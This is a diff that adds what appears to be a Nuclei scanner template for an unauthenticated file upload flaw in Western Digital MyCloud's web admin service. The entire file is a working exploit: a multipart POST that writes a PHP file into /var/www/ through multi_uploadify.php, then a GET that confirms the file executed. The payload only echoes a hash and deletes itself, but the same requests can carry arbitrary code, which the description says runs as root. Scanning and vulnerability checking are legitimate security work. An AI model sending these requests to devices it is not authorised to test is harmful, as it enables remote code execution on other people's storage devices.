@@ -1,0 +1,52 @@
+id: wd-mycloud-multi-uploadify-file-upload
+info:
+  name: Western Digital MyCloud multi_uploadify File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a file upload vulnerability in the Western Digital MyCloud web administration HTTP service. It allows attackers to upload malicious files to the server, potentially leading to arbitrary code execution as root.
+  tags: file-upload
+  reference:
+    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/wd_mycloud_multiupload_upload.rb
+
+variables:
+  random_str: '{{rand_base(8)}}'
+  filename: '{{rand_base(32)}}.php'
+  md5_hash: '{{md5(random_str)}}'
+
+http:
+  - raw:
+      - |
+        POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
+
+        -----------------------------735323031399963166993862150
+        Content-Disposition: form-data; name="Filedata[]"; filename="{{filename}}"
+        Content-Type: image/jpeg
+
+        <?php echo md5('{{random_str}}');unlink(__FILE__);?>
+        -----------------------------735323031399963166993862150--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "status=1"
+
+  - raw:
+      - |
+        GET /var/www/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5_hash}}"
